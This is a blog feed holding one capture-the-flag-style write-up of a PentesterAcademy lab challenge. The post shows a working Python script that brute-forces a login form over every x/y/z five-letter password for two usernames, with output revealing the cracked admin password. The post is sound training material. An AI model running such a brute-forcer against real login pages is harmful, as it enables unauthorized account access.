<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: pentester academy | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/pentester-academy/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2015-07-30T16:39:50+03:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[PentesterAcademy WAP Challenge 1: Form Bruteforcing]]></title>
    <link href="http://chousensha.github.io/blog/2014/07/27/pentesteracademy-wap-challenge-1-form-bruteforcing/"/>
    <updated>2014-07-27T00:31:26+03:00</updated>
    <id>http://chousensha.github.io/blog/2014/07/27/pentesteracademy-wap-challenge-1-form-bruteforcing</id>
    <content type="html"><![CDATA[<p><a href="http://www.pentesteracademy.com">PentesterAcademy</a> has a section dedicated to web application security challenges. In this post I will present my solution to the first challenge, which requires form bruteforcing to authenticate on the provided web page:</p>

<p><a href="http://pentesteracademylab.appspot.com/lab/webapp/1">http://pentesteracademylab.appspot.com/lab/webapp/1</a></p>

<!-- more -->


<p>This is how the page looks like:</p>

<p><img class="center" src="/images/wap1.png" title="&lsquo;wap1&rsquo; &lsquo;wap1&rsquo;" ></p>

<p>The provided hint should help with writing a bruteforce script:</p>

<p><strong>Hint:</strong></p>

<p><strong>Company Domain: PentesterAcademy.com</strong></p>

<p><strong>Usernames: jack, admin</strong></p>

<p><strong>Password Complexity: 5 characters and uses only x,y,z lowercase. Password examples &ndash; xxyyz, xyzxy, xyxxx etc.</strong></p>

<p>So, what we need here is to test the login with usernames of the form <em>user@companydomain</em> and 5 character passwords constructed from the given characters.</p>

<p>I wrote a Python script to do that:</p>

<p>``` python
import requests
import itertools</p>

<p>url = &lsquo;<a href="http://pentesteracademylab.appspot.com/lab/webapp/1">http://pentesteracademylab.appspot.com/lab/webapp/1</a>&rsquo;</p>

<p>emails = [&lsquo;<a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#x3a;&#106;&#x61;&#x63;&#107;&#x40;&#x70;&#x65;&#x6e;&#x74;&#x65;&#x73;&#116;&#101;&#x72;&#x61;&#99;&#97;&#100;&#x65;&#109;&#121;&#x2e;&#99;&#111;&#109;">&#x6a;&#97;&#99;&#x6b;&#64;&#x70;&#x65;&#x6e;&#116;&#x65;&#115;&#x74;&#x65;&#x72;&#97;&#99;&#x61;&#x64;&#101;&#109;&#121;&#46;&#99;&#111;&#x6d;</a>&rsquo;, \</p>

<pre><code>      'admin@pentesteracademy.com']
</code></pre>

<p>def buildPassList(iterables, r):</p>

<pre><code>passlist = []
for word in itertools.product(iterables, repeat = r):
    passlist.append(''.join(word))
return passlist
</code></pre>

<p>passlist = buildPassList(&lsquo;xyz&rsquo;, 5)</p>

<p>count = 0
fail = &lsquo;Failed! Please try again!&rsquo;
for user in emails:</p>

<pre><code>for passwd in passlist:
    print 'Try %d - email: %s password: %s' % (count, user, passwd)
    payload = {'email': user, 'password': passwd}
    req = requests.get(url, params=payload)
    if fail not in req.content:
        print payload
        print req.content
        break          
    count += 1
</code></pre>

<p>```</p>

<p>I used the requests module, which is very handy for all sorts of URL interaction. To figure out the parameter names and how are they passed to the login form, I tested with some garbage values and saw the URL looked like this:</p>

<p><code>plain
http://pentesteracademylab.appspot.com/lab/webapp/1?email=test&amp;password=xyz
</code></p>

<p>From that I knew to use the GET request in the code. Also, when you fail, you get a message stating that you should try again, so I looked for that in the response from the server, and I concluded that if it were absent, it means that the login was successful. When you complete the challenge, there is also a message that says &ldquo;Well done! This challenge has been cracked!&rdquo;</p>

<p>Here is a snippet of the output:</p>

<p><code>plain
Try 0 - email: jack@pentesteracademy.com password: xxxxx
Try 1 - email: jack@pentesteracademy.com password: xxxxy
...
Try 477 - email: admin@pentesteracademy.com password: zzzxx
Try 478 - email: admin@pentesteracademy.com password: zzzxy
{'password': 'zzzxy', 'email': 'admin@pentesteracademy.com'}
</code></p>

<p>Today&rsquo;s fortune cookie:</p>

<blockquote><p>While you recently had your problems on the run, they&rsquo;ve regrouped and
are making another attack.</p></blockquote>
]]></content>
  </entry>
  
</feed>
